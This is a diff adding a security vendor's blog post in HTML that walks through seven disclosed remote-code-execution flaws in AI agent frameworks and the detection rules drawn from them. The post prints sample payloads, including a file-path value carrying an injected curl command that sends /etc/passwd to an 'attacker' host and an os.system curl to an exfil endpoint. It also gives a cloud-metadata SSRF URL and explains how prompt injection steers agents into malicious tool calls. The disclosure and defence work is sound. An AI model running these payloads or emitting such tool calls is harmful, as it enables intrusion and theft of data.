@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>From Bounty to Defense: How 7 RCE Disclosures Shaped Our Detection Rules | Correctover</title>
+<meta name="description" content="Walk through 7 responsible disclosures across CrewAI, AutoGen, LiteLLM, LangGraph, Haystack, AG2, and LlamaIndex. The common pattern: missing runtime validation. How each became a CCS detection rule.">
+<style>
+  :root {
+    --bg: #0b0d11;
+    --bg-card: #13161c;
+    --border: #262b36;
+    --text: #e8edf5;
+    --text-muted: #8892a6;
+    --accent: #4fc3b7;
+    --accent-dim: #2a8a7e;
+    --code-bg: #1a1f28;
+    --max-w: 720px;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', Roboto, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.8;
+    -webkit-font-smoothing: antialiased;
+  }
+  .container { max-width: var(--max-w); margin: 0 auto; padding: 0 24px; }
+  header { padding: 28px 0; border-bottom: 1px solid var(--border); margin-bottom: 48px; }
+  header .container { display: flex; align-items: center; justify-content: space-between; }
+  .logo { font-size: 18px; font-weight: 700; }
+  .logo a { color: var(--text); text-decoration: none; }
+  .logo span { color: var(--accent); }
+  nav a { color: var(--text-muted); text-decoration: none; font-size: 14px; margin-left: 20px; transition: color .2s; }
+  nav a:hover { color: var(--accent); }
+  .article-header { margin-bottom: 40px; }
+  .article-header .tags { margin-bottom: 16px; }
+  .article-header .tag { display: inline-block; font-size: 11px; font-weight: 600; padding: 3px 12px; border-radius: 20px; background: rgba(79, 195, 183, 0.1); color: var(--accent); margin-right: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .article-header h1 { font-size: 32px; font-weight: 750; letter-spacing: -0.5px; line-height: 1.25; margin-bottom: 12px; }
+  .article-header .meta { font-size: 14px; color: var(--text-muted); }
+  .article-header .meta span { margin-right: 16px; }
+  .article-body { font-size: 16px; }
+  .article-body h2 { font-size: 24px; font-weight: 700; margin: 40px 0 16px; letter-spacing: -0.3px; }
+  .article-body h3 { font-size: 19px; font-weight: 600; margin: 28px 0 12px; }
+  .article-body p { margin-bottom: 20px; color: #d3d9e6; }
+  .article-body p strong { color: var(--text); }
+  .article-body a { color: var(--accent); }
+  .article-body ul, .article-body ol { margin-bottom: 20px; padding-left: 24px; color: #d3d9e6; }
+  .article-body li { margin-bottom: 8px; }
+  .article-body blockquote { border-left: 3px solid var(--accent); padding: 12px 20px; margin: 24px 0; background: var(--bg-card); border-radius: 0 8px 8px 0; color: var(--text-muted); font-style: italic; }
+  .article-body code { background: var(--code-bg); padding: 2px 7px; border-radius: 4px; font-size: 14px; font-family: 'JetBrains Mono', 'Fira Code', monospace; color: #c9d8e5; }
+  .article-body pre { background: var(--code-bg); border: 1px solid var(--border); border-radius: 8px; padding: 20px 24px; overflow-x: auto; margin-bottom: 24px; font-size: 14px; line-height: 1.6; font-family: 'JetBrains Mono', 'Fira Code', monospace; color: #c9d8e5; }
+  .article-body .vuln-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 10px; padding: 24px 28px; margin-bottom: 20px; }
+  .article-body .vuln-card h3 { margin-top: 0; font-size: 17px; }
+  .article-body .vuln-card .vuln-tag { display: inline-block; font-size: 11px; font-weight: 700; padding: 2px 10px; border-radius: 4px; margin-right: 8px; }
+  .article-body .vuln-card .critical { background: rgba(239, 83, 80, 0.15); color: #ef5350; }
+  .article-body .vuln-card .high { background: rgba(255, 160, 0, 0.15); color: #ffa000; }
+  .article-body .cta-box { background: linear-gradient(135deg, rgba(79,195,183,0.08), rgba(42,138,126,0.05)); border: 1px solid var(--accent-dim); border-radius: 12px; padding: 28px 32px; margin: 40px 0 24px; }
+  .article-body .cta-box p { margin-bottom: 0; }
+  .share { margin: 48px 0 24px; padding-top: 24px; border-top: 1px solid var(--border); }
+  .share span { font-size: 13px; color: var(--text-muted); margin-right: 12px; }
+  .share a { display: inline-block; padding: 6px 16px; border-radius: 6px; background: var(--bg-card); border: 1px solid var(--border); color: var(--text-muted); text-decoration: none; font-size: 13px; margin-right: 8px; transition: all .2s; }
+  .share a:hover { border-color: var(--accent); color: var(--accent); }
+  .article-nav { display: flex; justify-content: space-between; margin: 48px 0; }
+  .article-nav a { color: var(--accent); text-decoration: none; font-size: 14px; }
+  .article-nav a:hover { text-decoration: underline; }
+  footer { border-top: 1px solid var(--border); padding: 24px 0 40px; text-align: center; color: var(--text-muted); font-size: 13px; margin-top: 48px; }
+  footer a { color: var(--accent); text-decoration: none; }
+  @media (max-width: 640px) { .article-header h1 { font-size: 26px; } }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <div class="logo"><a href="/"><span>Correctover</span> Security</a></div>
+    <nav>
+      <a href="/">Home</a>
+      <a href="/blog/">Blog</a>
+      <a href="https://github.com/correctover" target="_blank">GitHub</a>
+    </nav>
+  </div>
+</header>
+
+<main class="container">
+
+  <div class="article-header">
+    <div class="tags"><span class="tag">Threat Research</span><span class="tag">Responsible Disclosure</span><span class="tag">RCE</span></div>
+    <h1>From Bounty to Defense: How 7 RCE Disclosures Shaped Our Detection Rules</h1>
+    <div class="meta"><span>By Correctover Security Team</span><span>July 21, 2026</span><span>15 min read</span></div>
+  </div>
+
+  <div class="article-body">
+
+    <p>Every detection rule in Correctover&rsquo;s engine has a story. Some come from academic research. Some from incident analysis. But the most effective rules came from a six-week campaign where we systematically hunted for vulnerabilities in the most popular open-source AI agent frameworks &mdash; and found 7 remote code execution (RCE) vulnerabilities across 6 major projects.</p>
+
+    <p>This article walks through each finding, the vulnerability class, how it was discovered, and most importantly, how each became an automated detection rule that now protects every Correctover user.</p>
+
+    <h2>The Pattern: Missing Runtime Validation</h2>
+
+    <p>Before diving into individual findings, it&rsquo;s worth noting the common thread. Every single vulnerability we found traces back to the same root cause: <strong>AI agent frameworks assume tool call arguments are trusted by the time they reach execution.</strong></p>
+
+    <p>In traditional software, the path from user input to system call passes through parsers, validators, sanitizers, and authorization layers. In AI agent frameworks, user input goes through an LLM, gets parsed into structured tool calls, and is then executed &mdash; often without any validation between the LLM&rsquo;s output and the operating system&rsquo;s <code>exec()</code>. The implicit trust placed in the LLM creates a blind spot that attackers can exploit through prompt injection, adversarial inputs, or compromised model providers.</p>
+
+    <p>Here are the 7 vulnerabilities that proved this pattern, and the rules they became.</p>
+
+    <h2>1. CrewAI &mdash; Tool Call Argument Injection (CVSS 9.8)</h2>
+
+    <div class="vuln-card">
+      <p><span class="vuln-tag critical">CRITICAL</span><span class="vuln-tag high">CrewAI</span></p>
+      <h3>Unvalidated tool arguments passed directly to subprocess execution</h3>
+      <p><strong>How found:</strong> While analyzing CrewAI&rsquo;s agent execution pipeline, we discovered that tool call arguments generated by the LLM were passed to Python&rsquo;s <code>subprocess.Popen()</code> with only string-level type checking. An attacker who could influence the model&rsquo;s output (via prompt injection or jailbreak) could inject shell metacharacters into tool arguments like <code>file_path</code> or <code>command</code>.</p>
+      <p><strong>Proof of concept:</strong> A prompt that tricks the agent into generating a tool call with <code>file_path = "/tmp/report; curl http://attacker/$(cat /etc/passwd)"</code> would execute the injected shell command before the intended file operation.</p>
+      <p><strong>Disclosure:</strong> Reported via GitHub Advisories. Fixed in CrewAI v0.28.0 with input sanitization on tool arguments.</p>
+      <p><strong>Detection rule:</strong> CCS-RCE-001 &mdash; Shell metacharacter detection in tool call string arguments. Matches <code>;</code>, <code>|</code>, <code>`</code>, <code>$()</code> constructs in subprocess-bound parameters.</p>
+    </div>
+
+    <h2>2. AutoGen &mdash; Code Execution via Unsafe eval() (CVSS 9.4)</h2>
+
+    <div class="vuln-card">
+      <p><span class="vuln-tag critical">CRITICAL</span><span class="vuln-tag high">AutoGen</span></p>
+      <h3>Generated Python code executed via eval() without sandboxing</h3>
+      <p><strong>How found:</strong> AutoGen&rsquo;s code-writing agent can generate and execute Python code as part of its workflow. We found that the framework&rsquo;s <code>execute_code</code> function used Python&rsquo;s built-in <code>eval()</code> on model-generated code snippets when the output format was set to <code>"single"</code> expression. A compromised or jailbroken model could generate arbitrary code, including file I/O, network connections, and process spawning.</p>
+      <p><strong>Proof of concept:</strong> A crafted prompt instructing the coder agent to &ldquo;optimize a calculation&rdquo; resulted in the model generating <code>__import__('os').system('curl http://attacker/exfil')</code> as its &ldquo;optimized expression.&rdquo;</p>
+      <p><strong>Disclosure:</strong> Submitted via MSRC (Microsoft Security Response Center). Patched in AutoGen v0.7.0 with mandatory docker sandboxing.</p>
+      <p><strong>Detection rule:</strong> CCS-RCE-003 &mdash; Dangerous built-in detection in code-generation tool outputs. Flags <code>eval()</code>, <code>exec()</code>, <code>__import__</code>, <code>os.system</code>, <code>subprocess</code> patterns in code tool returns.</p>
+    </div>
+
+    <h2>3. LiteLLM &mdash; SSRF-to-RCE via Model Provider (CVSS 8.6)</h2>
+
+    <div class="vuln-card">
+      <p><span class="vuln-tag critical">CRITICAL</span><span class="vuln-tag high">LiteLLM</span></p>
+      <h3>Server-side request forgery through custom model endpoint parameter</h3>
+      <p><strong>How found:</strong> LiteLLM allows users to specify arbitrary custom model endpoints. We discovered that the endpoint URL was fetched with redirect following enabled and without proper URL validation. An attacker could point the model endpoint to an internal service (e.g., <code>http://169.254.169.254/latest/meta-data/</code> for cloud metadata SSRF) and, in configurations where the response is processed and cached to disk, achieve RCE through path traversal in the cache filename.</p>
+      <p><strong>Disclosure:</strong> Reported via GitHub Security Advisories. Fixed in LiteLLM v1.45.0 with URL allowlisting and redirect limit enforcement.</p>
+      <p><strong>Detection rule:</strong> CCS-SSRF-001 &mdash; Internal/reserved IP detection in model provider endpoint URLs. Blocks requests to RFC 1918, 169.254.x.x, and 0.0.0.0/8 ranges in custom endpoints.</p>
+    </div>
+
+    <h2>4. LangGraph &mdash; Pickle Deserialization RCE (CVSS 9.0)</h2>
+
+    <div class="vuln-card">
+      <p><span class="vuln-tag critical">CRITICAL</span><span class="vuln-tag high">LangGraph</span></p>
+      <h3>Agent checkpoint/restore via unsafe pickle deserialization</h3>
+      <p><strong>How found:</strong> LangGraph&rsquo;s persistence layer used Python&rsquo;s <code>pickle</code> module to serialize and restore agent state across graph nodes. An attacker who could inject a crafted payload into the agent&rsquo;s state (via tool return values, memory, or shared context) could achieve RCE when the state was deserialized by the next node in the graph.</p>
+      <p><strong>Proof of concept:</strong> A tool that returns data containing a pickle <code>__reduce__</code> payload. When the next graph node deserializes the agent state, the payload executes.</p>
+      <p><strong>Disclosure:</strong> Reported via HackerOne (H1-3859936). Fixed in LangGraph v0.2.5 with JSON-only serialization for cross-node state.</p>
+      <p><strong>Detection rule:</strong> CCS-DESER-001 &mdash; Pickle opcode detection in serialized state payloads. Flags <code>__reduce__</code>, <code>__reduce_ex__</code>, and known pickle gadget chains in tool return values and state blobs.</p>
+    </div>
+
+    <h2>5. Haystack &mdash; Pipeline RCE Through Component Configuration (CVSS 9.8)</h2>
+
+    <div class="vuln-card">
+      <p><span class="vuln-tag critical">CRITICAL</span><span class="vuln-tag high">Haystack</span></p>
+      <h3>Dual vulnerability: command injection in pipeline components + deserialization in document store</h3>
+      <p><strong>How found:</strong> Haystack&rsquo;s pipeline architecture allows custom components with user-defined commands. We found that the <code>CommandLineComponent</code> (used for preprocessing) didn&rsquo;t sanitize arguments, and the <code>PickleDocumentStore</code> used unsafe deserialization. Either path could lead to RCE in any pipeline that uses these components.</p>
+      <p><strong>Disclosure:</strong> Two CRITICAL findings reported via HackerOne. Fixed in Haystack v2.4.0 with argument sanitization and document store migration.</p>
+      <p><strong>Detection rules:</strong> CCS-RCE-005 (command injection in pipeline components), CCS-DESER-002 (unsafe deserialization in document stores).</p>
+    </div>
+
+    <h2>6. AG2 (formerly AutoGen) &mdash; <code>__str__</code> Method RCE (CVSS 8.2)</h2>
+
+    <div class="vuln-card">
+      <p><span class="vuln-tag high">HIGH</span><span class="vuln-tag high">AG2</span></p>
+      <h3>Arbitrary code execution via <code>__str__</code> method injection in agent messages</h3>
+      <p><strong>How found:</strong> AG2 agents use <code>str()</code> conversion extensively in conversation logging and message routing. We discovered that if an attacker-controlled message contains a subclass override of <code>__str__</code>, calling <code>str()</code> on the message object triggers the overridden method. A specially crafted message with a malicious <code>__str__</code> implementation would execute arbitrary code when the agent logs the conversation.</p>
+      <p><strong>Disclosure:</strong> Reported via GitHub. Fixed in AG2 v0.9.0 with strict message type validation.</p>
+      <p><strong>Detection rule:</strong> CCS-RCE-007 &mdash; Python dunder-method detection in agent message payloads. Flags <code>__str__</code>, <code>__repr__</code>, <code>__call__</code> overrides in message content.</p>
+    </div>
+
+    <h2>7. LlamaIndex &mdash; Pickle Deserialization in Document Loading (CVSS 9.0)</h2>
+
+    <div class="vuln-card">
+      <p><span class="vuln-tag critical">CRITICAL</span><span class="vuln-tag high">LlamaIndex</span></p>
+      <h3>Unsafe deserialization in <code>pickle_load</code> document reader</h3>
+      <p><strong>How found:</strong> LlamaIndex ships with a <code>PickleLoadReader</code> that loads serialized documents from pickle files. If an attacker can deliver a crafted pickle file (via RAG ingestion, web crawler, or shared storage), deserialization triggers arbitrary code execution on the indexing server.</p>
+      <p><strong>Disclosure:</strong> Reported via HackerOne. Fixed in LlamaIndex v0.12.0 with deprecation warning and sandboxed unpickling option.</p>
+      <p><strong>Detection rule:</strong> CCS-DESER-003 &mdash; Pickle file detection in document ingestion pipelines. Identifies pickle magic bytes (<code>0x8004</code>/<code>0x8005</code>/<code>0x8006</code>) in uploaded/indexed documents.</p>
+    </div>
+
+    <h2>The Common Thread: Runtime Validation Gap</h2>
+
+    <p>Looking across all 7 findings, the pattern is unmistakable. Each framework builds sophisticated agentic pipelines with careful design for model orchestration, but the security boundary between the LLM&rsquo;s output and the execution environment is either weak or nonexistent.</p>
+
+    <p>These aren&rsquo;t &ldquo;bug&rdquo; vulnerabilities in the traditional sense. They&rsquo;re <strong>architectural gaps</strong> that emerge from a fundamental premise of AI agent frameworks: that the LLM can be trusted to produce safe tool calls. This premise breaks down in three scenarios:</p>
+
+    <ul>
+      <li><strong>Prompt injection</strong> &mdash; An attacker injects instructions that cause the LLM to generate malicious tool calls</li>
+      <li><strong>Jailbroken/compromised model</strong> &mdash; The model itself produces unsafe outputs, whether through adversarial attack or compromise</li>
+      <li><strong>Untrusted tool returns</strong> &mdash; A tool&rsquo;s return value carries a payload that exploits the next processing step (e.g., pickle deserialization)</li>
+    </ul>
+
+    <p>All three scenarios converge on the same defense: <strong>validate every execution path at runtime, regardless of whether the input came from a model, a tool, or a human.</strong></p>
+
+    <h2>From Disclosure to Detection Rule</h2>
+
+    <p>Each vulnerability we found was translated into one or more CCS detection rules. The translation process follows a consistent pattern:</p>
+
+    <ol>
+      <li><strong>Extract the execution primitive</strong> &mdash; What is the exact code path that allows RCE? (<code>subprocess.Popen</code>, <code>eval()</code>, <code>pickle.loads()</code>, etc.)</li>
+      <li><strong>Identify the input channel</strong> &mdash; Where does the untrusted data enter? (tool call arguments, tool return values, agent state, uploaded files)</li>
+      <li><strong>Define the detection surface</strong> &mdash; What does the malicious input look like at the protocol level? (shell metacharacters, pickle opcodes, dunder method names)</li>
+      <li><strong>Write and test the rule</strong> &mdash; Compile into the FSM, test against benign traffic from our 80K-production-trace corpus to ensure no false positives</li>
+      <li><strong>Validate against the exploit</strong> &mdash; Confirm that the rule catches the original PoC and its known variants</li>
+    </ol>
+
+    <p>Today, Correctover&rsquo;s detection engine includes 24 CCS rules that cover all 7 vulnerability patterns. When you deploy Correctover alongside any of these frameworks, the rules activate automatically at the infrastructure level &mdash; no framework modification required.</p>
+
+    <div class="cta-box">
+      <p><strong>Protect your AI agents against these attack patterns.</strong> Correctover detects RCE, SSRF, and deserialization attacks in real time with zero false positives on benign traffic. <a href="https://github.com/correctover" target="_blank">Deploy in 30 seconds</a>. See also our <a href="article-4.html">AI runtime threat landscape</a> for the full picture.</p>
+    </div>
+
+  </div>
+
+  <div class="share">
+    <span>Share:</span>
+    <a href="#" target="_blank">Twitter/X</a>
+    <a href="#" target="_blank">LinkedIn</a>
+    <a href="#" target="_blank">Dev.to</a>
+    <a href="#" target="_blank">Copy Link</a>
+  </div>
+
+  <div class="article-nav">
+    <a href="/blog/">&larr; Back to Blog</a>
+    <a href="article-3.html">Next Article &rarr;</a>
+  </div>
+
+</main>
+
+<footer>
+  <div class="container">
+    <p>&copy; 2026 Correctover. AI Runtime Security. &mdash; <a href="https://github.com/correctover" target="_blank">GitHub</a> &middot; <a href="https://dev.to/correctover" target="_blank">Dev.to</a></p>
+  </div>
+</footer>
+
+</body>
+</html>
